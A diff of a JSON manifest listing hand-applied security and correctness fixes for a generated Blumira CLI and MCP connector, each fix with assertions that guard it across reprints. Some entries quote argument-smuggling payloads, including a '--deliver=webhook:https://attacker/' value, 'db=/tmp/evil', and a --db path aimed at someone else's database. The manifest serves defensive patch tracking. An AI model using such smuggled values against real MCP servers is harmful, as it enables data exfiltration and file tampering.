@@ -3,34 +3,6 @@
  "doc": "docs/reprint-survival.md",
  "handfixes": [
   {
-   "id": "env-oauth-secrets-not-persisted",
-   "summary": "SaveTokens keeps the env-override marker on ClientID/ClientSecret, so env-supplied OAuth credentials are never written to config.toml (issue #266)",
-   "why": "Load() marks ClientID/ClientSecret as env overrides and configForSave() restores the file value for any field still marked -- the mechanism that keeps env-supplied secrets off disk. SaveTokens() cleared both markers on every save, so each token mint (an ordinary authenticated command, no `auth login` step needed) rewrote the live client_id and client_secret into ~/.config/<tool>-cli/config.toml in cleartext, defeating Keychain/Credential-Manager setups that inject the secret as an env var at process launch. SaveTokens now leaves those two markers alone; only MarkCredentialsExplicit clears them, and only `auth login` calls it, passing whether each value came from a flag rather than from the env fallback. Provenance must be declared, not inferred: comparing the incoming value against the loaded one cannot tell an explicit flag from the env value it duplicates, and `auth login` trims its env fallback while Load does not, so a padded variable compares unequal to itself and leaks. Reported by @Xenith-B against halopsa-cli/ninjaone-cli. GENERATOR-class defect (the press emits the unconditional deletes) tracked for an upstream retro; until the press is fixed, a reprint reintroduces the leak and these markers guard the connector. Bug-fix-only: no new flag, command, or output.",
-   "status": "active",
-   "spec_encode_followup": "DONE UPSTREAM: mvanhorn/cli-printing-press#4393 merged 2026-08-28 (closed #4283 as completed), first shipped press v4.31.2; this hand-fix stays active until a reprint absorbs it; do NOT cite #4283 as open. Encoded there: SaveTokens must not clear the ClientID/ClientSecret env-override markers. Only a credential the caller supplied through an explicit command-line flag may clear them, and the flag's provenance must be passed in by the caller -- NOT inferred by comparing the incoming value against the loaded one. An explicit flag whose value equals the environment's is still explicit and must persist; conversely `auth login` trims its env fallback while Load does not, so a padded variable compares unequal to itself and a value-based rule leaks it.",
-   "asserts": [
-    {
-     "file": "cli/internal/config/config.go",
-     "contains": "func (c *Config) MarkCredentialsExplicit(clientID, clientSecret bool) {",
-     "min_count": 1
-    },
-    {
-     "file": "cli/internal/cli/auth_login.go",
-     "contains": "cfg.MarkCredentialsExplicit(explicitClientID, explicitClientSecret)",
-     "min_count": 1
-    },
-    {
-     "file": "cli/internal/config/config.go",
-     "contains": "markers now survive a save; only MarkCredentialsExplicit clears them.",
-     "min_count": 1
-    },
-    {
-     "file": "cli/internal/config/config.go",
-     "not_contains": "delete(c.envOverrides, \"ClientID\")\n\tdelete(c.envOverrides, \"ClientSecret\")\n\tdelete(c.envOverrides, \"AccessToken\")"
-    }
-   ]
-  },
-  {
    "id": "doctor-verdict-tracks-reality",
    "summary": "doctor probes a real GET endpoint with the real credential and refuses to dial a placeholder base_url, instead of calling any HTTP response 'reachable' and never checking the credential",
    "why": "`doctor` is the command every SKILL, guide and docs page tells an operator to run to confirm the connector works, and it could not tell a working install from a broken one. It called any HTTP response to `GET /` \"reachable\" and rendered it green, so a base_url aimed at the vendor's web UI (where every API path 404s) and a token rejected with 401 on every call both produced an all-green report. On this connector family it also never probed the credential at all: it printed \"present, not verified\" and left the operator to guess. The mirror defect: a connector whose shipped base_url default is a placeholder dialled the placeholder host, and the DNS failure rendered as \"FAIL API: unreachable\" - telling a correctly-credentialled operator they were broken without naming the one variable that would fix it. Several placeholder hosts resolve through live wildcard DNS and answer real HTTP, so dialling one produced a confident green verdict against a stranger's server. Measured and gated by tools/maintainer/check_doctor_truth.py. See issue #282.",
@@ -41,7 +13,7 @@
      "contains": "func doctorProbeCredentials("
     },
     {
-     "file": "cli/internal/cli/doctor_verdict.go",
+     "file": "cli/internal/cli/doctor.go",
      "contains": "func doctorBaseURLIsPlaceholder("
     },
     {
@@ -63,6 +35,36 @@
     {
      "file": "cli/internal/cli/doctor.go",
      "not_contains": "for _, v := range report {"
+    },
+    {
+     "file": "cli/internal/cli/doctor.go",
+     "contains": "doctorProbeCredentials(cmd.Context(), c, cmd.Root(),",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/doctor.go",
+     "contains": "report[\"credentials\"] = \"ERROR not verified: no credential is configured, so nothing was probed.\"",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/doctor.go",
+     "contains": "report[\"api\"] = \"not configured (base_url is a placeholder); set \" + doctorBaseURLEnv + \" to your own instance URL\"",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/doctor.go",
+     "contains": "doctorBaseURLIsShippedPlaceholder(cfg.BaseURL)",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/doctor_verdict.go",
+     "contains": "func doctorBaseURLIsShippedPlaceholder(base string) bool {",
+     "min_count": 1,
+     "code_only": true
     }
    ]
   },
@@ -136,234 +138,490 @@
    ]
   },
   {
-   "id": "mcp-filesystem-destination-gate",
-   "summary": "The MCP shell-out layer refuses filesystem-destination flags (--db, --input, --output, --out, --home, --audit-dir, --receipt-file and friends) and any argument name carrying '=', so a tool call cannot point the local SQLite store, or any other file this account can reach, at a path of its choosing",
-   "why": "The MCP server runs the companion CLI as the server account and forwarded every command-local flag straight through as a CLI argument. `sync` and the other local-store commands expose --db, and the store's migration runs `DROP TABLE IF EXISTS resources_fts` plus a resources-table rebuild against whatever file it is handed, so one tool call shaped {\"db\": \"/path/to/someone-elses.sqlite\"} rewrote an unrelated database - no credentials required, because sync opens the store before it ever reaches the API. Proven end to end: against the pre-fix binary a single MCP tools/call on `sync` changed the victim file's sha and left resources_fts with 0 rows; against the patched binary the same call returns the same sync summary and the victim file is byte-identical. The gate has three parts, all in cli/internal/mcp/cobratree/shellout.go: blockedDestinationFlags (the runtime name floor, unioned into cliArgsFromMCP alongside the pre-existing blockedRootFlags behaviour, which is unchanged); an argument-name '=' guard, because \"db=/tmp/evil\" was emitted as --db=/tmp/evil and a name-only denylist never saw it; and isFilesystemPathFlag, which classifies a flag by its USAGE TEXT rather than its NAME. The usage-text test is load bearing and must not be turned into a name rule: the generated command surface carries API body fields called --path, --seed-path, --source-paths, --exclude-paths, --filename and --working-dir whose values go to the vendor API and never touch this account's disk, so a name rule would break real API surfaces while still missing the next generated flag that does take a local path. UnblockedFilesystemPathFlags applies that rule to the live Cobra tree over exactly the command set RegisterAll turns into shell-out tools (endpoint and framework commands are out of scope, which is what keeps the rule off generated vendor body fields), and TestNoShellOutToolCanDirectAFilesystemPath fails the build when a regeneration grows a local-path flag the floor does not name. vendorAPIPathFlags is the documented exception list for flags whose usage trips the rule but which name a location in the vendor's world. Both directions are pinned by the tests: the --db argument must be dropped AND an ordinary flag must still be forwarded, because a gate that swallows the real MCP surface is as harmful as one that misses the defect.",
-   "status": "active",
-   "spec_encode_followup": "Press-side: the gate belongs in the generator. Two known residuals a reprint should close rather than re-inherit. (1) On the pre-4.30 cobratree the blocked flags are dropped at forward time but still appear in the tool's input schema, because toolOptionsForFlags in typemap.go advertises every flag; the caller gets silence instead of an error. The 4.30 shape (blockedStructuredArgsForCommand + allowedStructuredArgsForCommand) removes them from the schema and errors on them, which is the better behaviour. (2) isFilesystemPathFlag is only consulted by the package test here, not at request time, because the pre-4.30 shellOutToCLI receives no *cobra.Command; wiring it into the per-command blocked set (as skills/servosity does) makes a newly generated path flag refused at runtime rather than at CI time.",
-   "asserts": [
-    {
-     "file": "cli/internal/mcp/cobratree/shellout.go",
-     "contains": "var blockedDestinationFlags = map[string]bool{",
-     "min_count": 1
-    },
-    {
-     "file": "cli/internal/mcp/cobratree/shellout.go",
-     "contains": "blockedDestinationFlags[k]",
-     "min_count": 1
-    },
-    {
-     "file": "cli/internal/mcp/cobratree/shellout.go",
-     "contains": "strings.Contains(k, \"=\")",
-     "min_count": 1
-    },
-    {
-     "file": "cli/internal/mcp/cobratree/shellout.go",
-     "contains": "func isFilesystemPathFlag(flag *pflag.Flag) bool {",
-     "min_count": 1
-    },
-    {
-     "file": "cli/internal/mcp/cobratree/shellout.go",
-     "contains": "func UnblockedFilesystemPathFlags(root *cobra.Command) []string {",
-     "min_count": 1
-    },
-    {
-     "file": "cli/internal/mcp/cobratree/filesystem_gate_test.go",
-     "contains": "func TestMCPCannotDirectTheLocalStore(",
-     "min_count": 1
-    },
-    {
-     "file": "cli/internal/mcp/cobratree/filesystem_gate_test.go",
-     "contains": "func TestMCPCannotSmuggleAFlagThroughAnEqualsSign(",
-     "min_count": 1
-    },
-    {
-     "file": "cli/internal/mcp/cobratree/filesystem_tree_test.go",
-     "contains": "func TestNoShellOutToolCanDirectAFilesystemPath(",
-     "min_count": 1
-    }
-   ]
-  },
-  {
-   "id": "mcp-argv-value-joined",
-   "summary": "cliArgsFromMCP emitted every tool-call value as its OWN argv element after its flag (--json <value>). Every value-carrying branch (string, float64, []any, default) now joins the value to the flag as one element (--json=<value>); bool true stays a bare --flag and the empty-string skip is unchanged.",
-   "why": "blockedRootFlags and blockedDestinationFlags filter KEYS only. A Cobra bool flag has NoOptDefVal and does not consume the token after it, so a tool-call VALUE that begins with '--' was parsed by pflag as its own flag: {\"json\": \"--deliver=webhook:https://attacker/\"} became argv `--json --deliver=webhook:...` and the denylisted --deliver took effect. Proven end to end on the real hudu-mcp binary (this same generated shellout.go) during the PR #317 review: a local webhook received 4,797 bytes of `doctor --json` output. Reported privately per SECURITY.md on 2026-09-09 as affecting the whole fleet (six connectors spot-checked by the reporter); this is the fleet backport of datagate commit 4075043e. Joined, pflag rejects the value outright on a bool flag (strconv.ParseBool) and contains it as the literal value on a string flag, so no value can ever reach a second flag. Fixed upstream in cli-printing-press main at be378adf (#4647, closes #4643, 2026-09-09) with the identical four lines, but NOT yet in a tagged press release (latest 4.32.1), so a reprint from any press at or below 4.32.1 REINTRODUCES the defect while go build and go test stay green; this entry is what notices. Retire it only after a reprint from a press release that carries #4647. code_only because the explanatory comment above the loop describes the joined form - the assert must be satisfied by the emission lines themselves. shellout_test.go (TestCliArgsFromMCP_ValueCannotSmuggleBlockedFlag) proves both directions: the split argv sets --deliver, the joined argv cannot.",
+   "id": "auth-login-novel-survives-retire",
+   "summary": "The hand-written `auth login` novel (internal/cli/auth_login.go: client_credentials mint against auth.blumira.com) still declares flag provenance to the press-native MarkCredentialsExplicit, so a credential inherited from BLUMIRA_CLIENT_ID/BLUMIRA_CLIENT_SECRET is never written to config.toml; this entry also keeps the file alive through the fleet replay.",
+   "why": "Press 4.34.0 made env-oauth-secrets-not-persisted native (SaveTokens keeps the env markers and the press generates MarkCredentialsExplicit), so the fleet replay retires that entry. Its asserts were the only ones naming cli/internal/cli/auth_login.go, and replay_handfixes.py deletes every hand-written file that only a retired entry pinned ('a retired hand-fix's own file'). auth_login.go is not a test of the hand-fix: it is the connector's only way to mint a JWT (novel feature 'Self-minting OAuth2 auth login'). On the 4.35.1 reprint the replay deleted it and the build failed (root.go: undefined newNovelAuthLoginCmd). The press-native MarkCredentialsExplicit only helps if the one caller that receives flags passes provenance, which is this file; the asserts pin that call so the env secret stays off disk.",
    "status": "active",
    "asserts": [
     {
-     "file": "cli/internal/mcp/cobratree/shellout.go",
-     "contains": "out = append(out, \"--\"+k+\"=\"+tv)",
+     "file": "cli/internal/cli/auth_login.go",
+     "contains": "cfg.MarkCredentialsExplicit(explicitClientID, explicitClientSecret)",
      "min_count": 1,
      "code_only": true
     },
     {
-     "file": "cli/internal/mcp/cobratree/shellout.go",
-     "contains": "out = append(out, \"--\"+k+\"=\"+strconv.FormatFloat(tv, 'f', -1, 64))",
+     "file": "cli/internal/cli/auth_login.go",
+     "contains": "explicitClientSecret := flagClientSecret != \"\"",
      "min_count": 1,
      "code_only": true
     },
     {
-     "file": "cli/internal/mcp/cobratree/shellout.go",
-     "contains": "out = append(out, \"--\"+k+\"=\"+strings.Join(parts, \",\"))",
-     "min_count": 1,
-     "code_only": true
-    },
-    {
-     "file": "cli/internal/mcp/cobratree/shellout.go",
-     "contains": "out = append(out, \"--\"+k+\"=\"+fmt.Sprintf(\"%v\", v))",
-     "min_count": 1,
-     "code_only": true
-    },
-    {
-     "file": "cli/internal/mcp/cobratree/shellout.go",
-     "not_contains": "\"--\"+k, "
-    },
-    {
-     "file": "cli/internal/mcp/cobratree/shellout_test.go",
-     "contains": "func TestCliArgsFromMCP_ValueCannotSmuggleBlockedFlag(",
-     "min_count": 1,
-     "code_only": true
-    },
-    {
-     "file": "cli/internal/mcp/cobratree/shellout_test.go",
-     "contains": "\"--filter=map[a:1]\"",
+     "file": "cli/internal/cli/auth_login.go",
+     "contains": "func newNovelAuthLoginCmd(flags *rootFlags) *cobra.Command {",
      "min_count": 1,
      "code_only": true
     }
    ]
   },
   {
-   "id": "mcp-recipe-argv-not-flag-like",
-   "summary": "Recipe intent handlers (internal/mcp/intents.go) build argv for the companion CLI outside cliArgsFromMCP. appendRecipeStringFlag now always emits one --name=value element (the useEquals=false split branch is gone), and every appendRecipePositional call site first runs rejectFlagLikeRecipeValue, which refuses a positional value beginning with '-' (except the bare '-') before the CLI runs.",
-   "why": "Found by Codex adversarial review of the fleet mcp-argv-value-joined backport (2026-09-09): the recipe path had the same key-only gap. A recipe positional is appended to argv AHEAD of the recipe's own flags, so {\"domain\": \"--deliver=webhook:https://attacker/\"} became `exceptions find --deliver=webhook:... --agent` and pflag parsed the value as the denylisted root flag (and {\"domain\": \"--dry-run\"} demonstrably changed execution). The split appendRecipeStringFlag branch was safe only because its one caller's flag is a string flag that consumes the next token; a future NoOptDefVal flag would reopen it. Upstream cli-printing-press be378adf (#4647) fixed cliArgsFromMCP but NOT this recipe path, so a reprint REINTRODUCES it while go build and go test stay green; this entry is what notices. Mirrors cobratree.validatePositionalArgsForMCP, which already applies this rule to the raw args field. Retire only when the press generator refuses flag-like recipe positionals itself.",
+   "id": "sync-partitions-keep-published-names",
+   "summary": "sync keeps the partition names every published store uses: /org/users syncs as `org` and /org/agents/devices as `org-agents-devices` (press 4.35.1 renders them as `org-users` and `org`).",
+   "why": "Press 4.35.1 re-derived the org partition names: devices moved into `org` and users into a new `org-users`, with every gate green. The dc-roster and exposure novels and the shared analytics engine read `org-agents-devices`, so on the raw render they reported zero devices; and an existing 4.24.0 store keeps users under `org`, so devices synced into `org` would mix with stale user rows that a domain-controller rollup would misread. bin/resource_names.py (cli-factory/blumira/reprint-4351-20261102) swaps the two keys back in the partition tables only (sync.go maps and cases, channel_workflow.go, data_source.go, learn_init.go, and store.go's resourceIDFieldOverrides), leaving the typed-table UpsertOrg route on `org` as published. Spec cannot pin it: x-pp-resource forces a flat resource and renames the command path. The swap must not touch reconcileTypedTables: it is keyed by the partition UpsertBatch writes into each typed table, and UpsertOrg's typed table `org` holds /org/users rows, so it stays `\"org\": \"org\"`. Swapping it there (codex review r1) made `sync --full` prune of org-agents-devices fail with \"no such table: org-agents-devices\", leaving removed devices in exposure/dc-roster, and left pruned users in the typed table; reconcile_typed_table_test.go prunes every partition and fails on that swap (logs/seen-r1-reconcile-typed-table-fails.log).",
    "status": "active",
    "asserts": [
     {
-     "file": "cli/internal/mcp/intents.go",
-     "contains": "return append(args, \"--\"+name+\"=\"+selected), false",
+     "file": "cli/internal/cli/sync.go",
+     "contains": "\"org-agents-devices\":        \"/org/agents/devices\",",
      "min_count": 1,
      "code_only": true
     },
     {
-     "file": "cli/internal/mcp/intents.go",
-     "not_contains": "\"--\"+name, selected"
+     "file": "cli/internal/cli/sync.go",
+     "contains": "\"org\":                       \"/org/users\",",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/sync.go",
+     "not_contains": "\"org-users\""
+    },
+    {
+     "file": "cli/internal/store/store.go",
+     "not_contains": "\"org-users\""
+    },
+    {
+     "file": "cli/internal/cli/analytics_engine.go",
+     "contains": "s.List(\"org-agents-devices\"",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/sync.go",
+     "contains": "\t\"org\": \"org\",\n}",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/sync.go",
+     "not_contains": "\"org-agents-devices\": \"org-agents-devices\""
+    },
+    {
+     "file": "cli/internal/cli/reconcile_typed_table_test.go",
+     "contains": "func TestReconcileTypedTableMatchesUpsertRoute(t *testing.T) {",
+     "min_count": 1,
+     "code_only": true
     }
    ]
   },
   {
-   "id": "interim-http-security-note-2026-10-22",
-   "summary": "mcp-install.md, README.md and page.json carry the interim security note and pause the remote-agent recipe (stdio-to-HTTP bridge launch line commented out, no tunnel step) until this connector is reprinted.",
-   "why": "Docs-only interim fix ratified 2026-10-22 (follow-up to #428). This connector is stdio-only, so the remote-agent recipe put it behind a supergateway bridge that adds no password: anyone who can reach the bridge's port can use the MCP tools with the stored credentials. The docs must not tell anyone to run the bridge or tunnel it. mcp-install.md and README.md are regenerated by msp-skills-publish onboard.py (gen_mcp_install, render_readme); this entry makes a regeneration that drops the note fail CI. Remove it on purpose with the post-reprint docs fix.",
+   "id": "mcp-context-full-novel-text",
+   "summary": "The MCP `context` tool's command_mirror_capabilities carry each novel's full description and rationale from research.json; press 4.35.1 cuts them at the first comma or period.",
+   "why": "An agent picks a tool from this text; 11 of 14 rationales and the overview description rendered as fragments ('Aggregates findings, agents'). bin/reapply.py restores the research.json text. Cosmetic for safety, but the published tree carried the full text and a reprint silently cut it.",
    "status": "active",
    "asserts": [
     {
-     "file": "mcp-install.md",
-     "contains": "**Security note (until this connector is reprinted).**",
+     "file": "cli/internal/mcp/tools.go",
+     "contains": "\"description\": \"One-screen per-account rollup: open findings by priority, agent coverage, and detection-coverage drift across every client.\"",
      "min_count": 1
     },
     {
-     "file": "mcp-install.md",
-     "contains": "# Remote agents (paused until this connector is reprinted)",
+     "file": "cli/internal/mcp/tools.go",
+     "contains": "three synced tables joined into one rollup no API call returns.",
      "min_count": 1
-    },
-    {
-     "file": "mcp-install.md",
-     "not_contains": "via a secure tunnel"
-    },
-    {
-     "file": "README.md",
-     "contains": "**Security note (until this connector is reprinted).**",
-     "min_count": 1
-    },
-    {
-     "file": "README.md",
-     "contains": "the bridge it would need is paused until it is reprinted",
-     "min_count": 1
-    },
-    {
-     "file": "README.md",
-     "not_contains": "--addr :7777"
-    },
-    {
-     "file": "page.json",
-     "contains": "the bridge it would need is paused until it is reprinted",
-     "min_count": 1
-    },
-    {
-     "file": "page.json",
-     "not_contains": "--addr :7777"
-    },
-    {
-     "file": "README.md",
-     "not_contains": "via the `supergateway` bridge"
-    },
-    {
-     "file": "page.json",
-     "not_contains": "via a secure bridge"
     }
    ]
   },
   {
-   "id": "mcp-file-flags-refused",
-   "class": "mcp-file-flag",
-   "summary": "An MCP tool call can no longer name a file or directory on the MCP host: the cobratree mirror (press 4.24 and earlier) computes one blocked set per command (destination flags and mcp:write-flags always, root control-plane flags unless the command redefines them locally), leaves those flags out of the tool schema, and refuses both them and any argument the command does not declare with an error naming it; before, the schema advertised them, the shell-out layer forwarded any key it was handed, and blocked ones were dropped silently, so a call ran without the input it asked for and an undeclared key reached a subcommand through the args field (superops raw --vars @path)",
-   "why": "The MCP server runs the companion CLI as the account that hosts it; the operator at the command line is trusted, an MCP caller is not. tools/maintainer/check_mcp_file_flags.py derives, from data flow in this connector's code, every flag whose value can start a filesystem path (open, read, write, stat, mkdir, walk, exec, @path expansion), then drives the real MCP server and asserts each such flag is absent from every mirrored tool's schema and refused by name when supplied, and that an ordinary flag still reaches the CLI. On origin/main this connector failed it. Edits: the cobratree mirror (press 4.24 and earlier) computes one blocked set per command (destination flags and mcp:write-flags always, root control-plane flags unless the command redefines them locally), leaves those flags out of the tool schema, and refuses both them and any argument the command does not declare with an error naming it; before, the schema advertised them, the shell-out layer forwarded any key it was handed, and blocked ones were dropped silently, so a call ran without the input it asked for and an undeclared key reached a subcommand through the args field (superops raw --vars @path). The CLI keeps every flag. A reprint that drops these edits fails that check in CI and these asserts here.",
+   "id": "auth-login-mint-pinned-to-token-host",
+   "summary": "`auth login` sends the client secret only to the configured token endpoint: its mint client refuses every redirect, and the press's GuardTokenRequest refuses a plaintext (non-loopback http) token URL before dialing.",
+   "why": "The novel minted with http.DefaultClient, which follows 301/302/307/308; a 307/308 replays the POST body, client_secret included, to whatever host Location names (proven: internal/cli/auth_login_redirect_test.go TestMintRefusesEveryRedirect failed on the published code for all four codes, and the secret reached the second server on 307 and 308). Host pinning stays connector-owned under the credential kit. The novel also accepted --auth-url http://<remote>, sending the secret in cleartext; GuardTokenRequest (4.35.1 client) now refuses it (TestMintRefusesPlaintextRemoteTokenURL, seen failing with the guard removed).",
    "status": "active",
-   "spec_encode_followup": "Press-side: derive the MCP-refused flag set from data flow (a flag whose value can start a filesystem path) instead of usage text or a name list, drop refused flags from every tool schema, refuse them by name at call time, and refuse binary multipart fields in the in-process endpoint handler. Drafted as an upstream issue for cli-printing-press (import --input exposure); tools/maintainer/check_mcp_file_flags.py is the fleet gate until a reprint carries it.",
    "asserts": [
     {
-     "file": "cli/internal/mcp/cobratree/walker.go",
-     "contains": "blocked := blockedFlagsForCommand(cmd)",
+     "file": "cli/internal/cli/auth_login.go",
+     "contains": "return http.ErrUseLastResponse",
      "min_count": 1,
      "code_only": true
     },
     {
-     "file": "cli/internal/mcp/cobratree/walker.go",
-     "contains": "shellOutToCLI(cliPath, path, blocked, declaredMCPFlagNames(cmd), inlineOnlyFlagsForCommand(cmd), commandTakesArgs(cmd))",
+     "file": "cli/internal/cli/auth_login.go",
+     "contains": "req, err = client.GuardTokenRequest(noRedirect, req, []byte(encoded))",
      "min_count": 1,
      "code_only": true
     },
     {
-     "file": "cli/internal/mcp/cobratree/typemap.go",
-     "contains": "func toolOptionsForFlags(cmd *cobra.Command, blocked map[string]bool) []mcplib.ToolOption {",
+     "file": "cli/internal/cli/auth_login.go",
+     "not_contains": "http.DefaultClient.Do(req)"
+    },
+    {
+     "file": "cli/internal/cli/auth_login_redirect_test.go",
+     "contains": "func TestMintRefusesEveryRedirect(",
+     "min_count": 1
+    }
+   ]
+  },
+  {
+   "id": "mcp-endpoint-write-confirm",
+   "class": "mcp-surface",
+   "summary": "Every typed MCP endpoint tool that is not read-only (assign owners, add a comment, resolve a finding; org and MSP sub-account) returns a preview and sends nothing until confirm is boolean true",
+   "why": "Work-order rule: every MCP write previews and sends only with confirm: true. At 4.35.1 (and in the published 0.1.6) the six generated endpoint write tools sent on the first call. The gate wraps every registered non-read-only, non-mirrored tool, so an endpoint a later print adds is gated too (abnormal/skykick/connectwise-automate precedent). A recipe intent over a command annotated mcp:read-only is marked read-only instead of gated (find_unprotected_domain_controllers over exposure). blumira_endpoint_confirm_test.go proves an unconfirmed call reaches the server 0 times and a confirmed one once (seen failing unwired: logs/seen-endpoint-confirm-fails.log); blumira_confirm_registered_test.go fails on the unwired tools.go (logs/seen-confirm-fails.log).",
+   "status": "active",
+   "asserts": [
+    {
+     "file": "cli/internal/mcp/tools.go",
+     "contains": "RequireConfirmForEndpointWrites(s)",
      "min_count": 1,
      "code_only": true
     },
     {
-     "file": "cli/internal/mcp/cobratree/typemap.go",
-     "contains": "if blocked[flag.Name] {",
+     "file": "cli/internal/mcp/blumira_endpoint_confirm.go",
+     "contains": "func RequireConfirmForEndpointWrites(s *server.MCPServer) {",
      "min_count": 1,
      "code_only": true
     },
     {
-     "file": "cli/internal/mcp/cobratree/shellout.go",
-     "contains": "if msg := refuseMCPArgs(args, declared, blocked, inlineOnly, takesArgs); msg != \"\" {",
+     "file": "cli/internal/mcp/blumira_endpoint_confirm_test.go",
+     "contains": "func TestEndpointWriteSendsOnlyWithConfirm(",
      "min_count": 1,
      "code_only": true
     },
     {
-     "file": "cli/internal/mcp/cobratree/mcp_file_flags.go",
-     "contains": "func refuseMCPArgs(args map[string]any, declared, blocked, inlineOnly map[string]bool, takesArgs bool) string {",
+     "file": "cli/internal/mcp/blumira_confirm_registered_test.go",
+     "contains": "func TestRegisteredMirroredWritesNeedConfirm(",
+     "min_count": 1,
+     "code_only": true
+    }
+   ]
+  },
+  {
+   "id": "mcp-mirror-write-confirm",
+   "class": "mcp-surface",
+   "summary": "Every mirrored (shell-out) MCP tool that may change Blumira data (none today; any command a later print adds) previews with --dry-run and sends only with confirm boolean true",
+   "why": "Same contract as mcp-endpoint-write-confirm for the cobratree mirror. Fail closed: only read-only tools, mcp:local-write commands and the listed local-only commands (export, sync, workflow archive, learnings forget/reject) run without confirm.",
+   "status": "active",
+   "asserts": [
+    {
+     "file": "cli/internal/mcp/tools.go",
+     "contains": "cobratree.RequireConfirmForMirroredWrites(s, cli.RootCmd(), cobratree.CachedSiblingCLIPath)",
      "min_count": 1,
      "code_only": true
     },
     {
-     "file": "cli/internal/mcp/cobratree/mcp_file_flags.go",
-     "contains": "func blockedFlagsForCommand(cmd *cobra.Command) map[string]bool {",
+     "file": "cli/internal/mcp/cobratree/blumira_confirm.go",
+     "contains": "func RequireConfirmForMirroredWrites(s *server.MCPServer, root *cobra.Command, cliPath func() (string, error)) {",
+     "min_count": 1,
+     "code_only": true
+    }
+   ]
+  },
+  {
+   "id": "doctor-dials-real-vendor-host",
+   "summary": "doctor_verdict.go ships doctorShippedBaseURL = \"\": the default https://api.blumira.com/public-api/v1 is Blumira's one real API host, so doctor dials it and probes the credential instead of reporting a healthy install as an unset placeholder.",
+   "why": "press-traps s5: the published 0.1.6 (and the doctor-verdict replay's restore from HEAD) set doctorShippedBaseURL to the real host, so every healthy install printed 'ERROR base_url is still the shipped placeholder' and skipped the credential probe. internal/cli/doctor_shipped_host_test.go fails on that value (logs/seen-doctor-real-host-fails.log).",
+   "status": "active",
+   "asserts": [
+    {
+     "file": "cli/internal/cli/doctor_verdict.go",
+     "contains": "const doctorShippedBaseURL = \"\"",
      "min_count": 1,
      "code_only": true
     },
     {
-     "file": "cli/internal/mcp/cobratree/mcp_file_flags.go",
-     "contains": "if name != mcpPositionalArgsField && !local[name] {",
+     "file": "cli/internal/cli/doctor_shipped_host_test.go",
+     "contains": "func TestDoctorDialsTheRealVendorHost(",
+     "min_count": 1
+    }
+   ]
+  },
+  {
+   "id": "sync-post-hooks",
+   "class": "sync",
+   "summary": "After its resource walks, sync records a finding snapshot (history point) and walks every MSP sub-account's device list (GET /msp/accounts/{account_id}/agents/devices) with a per-account coverage record.",
+   "why": "Codex review r1 (2026-11-02): the over-time novels (drift, velocity, audit, recurring) only captured history when one of them ran, so states between syncs were lost and audit missed a finding resolved then reopened across three syncs (logs/seen-r1-history-not-captured-at-sync-fails.log); and the device novels (exposure, dc-roster, overview) read only /org/agents/devices, so a stale domain controller in an MSP sub-account never appeared (logs/seen-r1-partition-never-filled-fails.log). The press has no dependent sync for /msp/accounts/{account_id}/agents/devices, so a hand hook in sync.go calls blumiraPostSync (internal/cli/blumira_post_sync.go) and folds its results into sync's success/failure counts. Skipped under --dry-run and PRINTING_PRESS_VERIFY; the device walk is skipped under dogfood (the device commands then name every sub-account as devices-not-synced).",
+   "status": "active",
+   "asserts": [
+    {
+     "file": "cli/internal/cli/sync.go",
+     "contains": "blumiraPostSync(cmd.Context(), c, db, resources, failedResources, syncEventWriter, humanFriendly)",
      "min_count": 1,
      "code_only": true
     },
     {
-     "file": "cli/internal/mcp/cobratree/mcp_file_flags.go",
-     "contains": "func flagWriteSinkNames(cmd *cobra.Command) map[string]bool {",
+     "file": "cli/internal/cli/blumira_post_sync.go",
+     "contains": "func blumiraPostSync(ctx context.Context, c blumiraPageGetter, db *store.Store, resources, failed []string, events io.Writer, human bool) []syncResult {",
      "min_count": 1,
      "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/blumira_post_sync.go",
+     "contains": "recordFindingHistory(db.DB(), db, findings, time.Now().UTC(), true)",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/blumira_post_sync.go",
+     "contains": "fetchAllBlumiraPages(ctx, c, \"/msp/accounts/\"+url.PathEscape(a.ID)+\"/agents/devices\", mspDeviceMaxPages)",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/blumira_review_test.go",
+     "contains": "func TestReviewSyncFillsSubAccountDevices(t *testing.T) {",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/blumira_review_test.go",
+     "contains": "func TestReviewSyncRecordsHistoryForAudit(t *testing.T) {",
+     "min_count": 1,
+     "code_only": true
+    }
+   ]
+  },
+  {
+   "id": "novel-analytics-review-fixes",
+   "class": "novel",
+   "summary": "Codex review r1 fixes in the hand-written analytics: one owner parser that reads the documented role-keyed owners object and reports unknown ownership; a fail-closed pager for every live list read (evidence, sub-account devices); literal, per-finding evidence search; snapshot history identified by sync with fixed-width ordered keys; velocity by latest state; device reports name every sub-account they could not read. Round 2: an empty sync is a history point; direct-org device coverage comes from sync's completion record; owners keep one identity per id/email; evidence-search de-duplicates both sources before --limit.",
+   "why": "The published 0.1.6 analytics (press 4.24) carry every one of these defects; an onboard replay that restores the published copies of analytics_engine.go, analytics_engine_extra.go or evidence_search.go over this tree reverts them with every gate green. Seen failing on the pre-fix tree: logs/seen-r1-{ownership-read,incomplete-paging,search-term-pattern,limit-before-dedupe,snapshot-identity,velocity-sticky-state}-fails.log (cli-factory/blumira/reprint-4351-20261102).",
+   "status": "active",
+   "asserts": [
+    {
+     "file": "cli/internal/cli/analytics_engine_extra.go",
+     "contains": "func decodeOwnership(m map[string]any) ([]string, bool) {",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/analytics_engine.go",
+     "contains": "owners, known := decodeOwnership(m)",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/analytics_engine_extra.go",
+     "not_contains": "func decodeOwners("
+    },
+    {
+     "file": "cli/internal/cli/analytics_engine_extra.go",
+     "contains": "WHERE content LIKE '%' || ? || '%' ESCAPE '\\'",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
